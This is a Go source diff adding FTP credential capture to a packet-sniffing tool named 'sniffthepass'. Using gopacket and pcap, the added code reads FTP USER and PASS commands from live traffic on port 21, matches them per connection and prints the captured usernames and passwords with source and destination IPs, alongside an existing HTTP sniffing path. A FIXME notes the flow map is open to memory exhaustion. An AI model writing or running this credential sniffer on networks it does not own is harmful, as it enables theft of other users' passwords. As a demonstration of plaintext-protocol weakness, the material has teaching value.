@@ -14,6 +14,40 @@ import (
 	"github.com/google/gopacket/pcap"
 )
 
+var ftpFlowUsernames map[gopacket.Flow]map[gopacket.Flow]string
+// FIXME: vulnerable to denial-of-service via memory exhaustion
+
+func processFTPPayload(ip4 *layers.IPv4, t *layers.TCP, payload []byte) {
+	str := string(payload)
+	lines := strings.Split(str, "\r\n")
+
+	for _, l := range lines {
+		networkFlow := ip4.NetworkFlow()
+		transportFlow := t.TransportFlow()
+
+		if strings.HasPrefix(l, "USER ") == true {
+			user := strings.TrimPrefix(l, "USER ")
+
+			if ftpFlowUsernames[networkFlow] == nil {
+				ftpFlowUsernames[networkFlow] = make(map[gopacket.Flow]string)
+			}
+
+			ftpFlowUsernames[networkFlow][transportFlow] = user
+		} else if strings.HasPrefix(l, "PASS ") == true {
+			if user, ok := ftpFlowUsernames[networkFlow][transportFlow]; ok {
+				pass := strings.TrimPrefix(l, "PASS ")
+				fmt.Printf("%v -> %v : %s:%s\n", ip4.SrcIP, ip4.DstIP, user, pass)
+
+				delete(ftpFlowUsernames[networkFlow], transportFlow)
+
+				if len(ftpFlowUsernames[networkFlow]) == 0 {
+					delete(ftpFlowUsernames, networkFlow)
+				}
+			}
+		}
+	}
+}
+
 func processHTTPPayload(ip4 *layers.IPv4, payload []byte) {
 	str := string(payload)
 	lines := strings.Split(str, "\r\n")
@@ -33,6 +67,8 @@ func processHTTPPayload(ip4 *layers.IPv4, payload []byte) {
 func processTCPSegment(ip4 *layers.IPv4, t *layers.TCP) {
 	if t.DstPort == 80 {
 		processHTTPPayload(ip4, t.Payload)
+	} else if t.DstPort == 21 {
+		processFTPPayload(ip4, t, t.Payload)
 	}
 }
 
@@ -48,6 +84,8 @@ func processPacket(packet gopacket.Packet) {
 
 func main() {
 	fmt.Println("sniffthepass")
+
+	ftpFlowUsernames = make(map[gopacket.Flow]map[gopacket.Flow]string)
 
 	netInfs, err := pcap.FindAllDevs()
 
